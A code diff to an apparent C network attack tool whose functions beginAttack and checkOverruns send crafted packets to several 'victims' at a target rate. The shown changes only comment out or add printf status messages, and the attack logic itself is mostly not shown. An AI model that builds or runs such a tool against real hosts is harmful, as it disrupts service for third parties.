@@ -366,7 +366,7 @@ void *checkOverruns(void *vargp) {
 
       for (i = 0; i < m_args->num_victims && current_time.tv_sec - start_time.tv_sec <= m_args->duration; i++) {
 
-        printf("Waiting to receive packet from host %d\n", i);
+        //printf("Waiting to receive packet from host %d\n", i);
         unsigned read_seq = read_packet(&(m_args->m_victims[i]),
                                           m_args->socket,
                                           m_args->m_victims,
@@ -382,6 +382,8 @@ void *checkOverruns(void *vargp) {
 }
 
 int beginAttack(int duration, double target_rate, int num_victims) {
+
+    printf("Beginning with %d victims. Please wait 30 seconds.\n", num_victims);
 
     // local variables
     int sock, i;
@@ -532,21 +534,22 @@ int beginAttack(int duration, double target_rate, int num_victims) {
                   0);                           // w_scale
 
     }
-    printf("Waiting to join\n");
+    //printf("Waiting to join\n");
     pthread_join(tid, NULL);
 
-    printf("Joined with other thread\n");
+    //printf("Joined with other thread\n");
     for (i = 0; i < num_victims; i++ ) {
       pthread_mutex_destroy(&(m_victims[i].lock));
     }
 
     close(sock);
+    printf("Completed\n");
 }
 
 
 
 int main(int argc, char const *argv[]) {
-  printf("In Main: About to begin:");
+  //printf("In Main: About to begin:");
   // TODO, more arguments will be provided as the ip and ports of victims
 
   int num_victims = atoi(argv[1]);
